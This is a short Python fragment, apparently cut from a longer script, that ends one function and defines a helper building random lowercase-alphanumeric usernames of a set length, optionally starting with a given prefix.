    return found

def generate_user_with_prefix(prefix, total_length):
    if not prefix:
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(total_length))
    
    prefix_len = len(prefix)
    if prefix_len >= total_length:
        return prefix
    
    needed = total_length - prefix_len
    chars = string.ascii_lowercase + string.digits
    suffix = ''.join(random.choice(chars) for _ in range(needed))
    return prefix + suffix

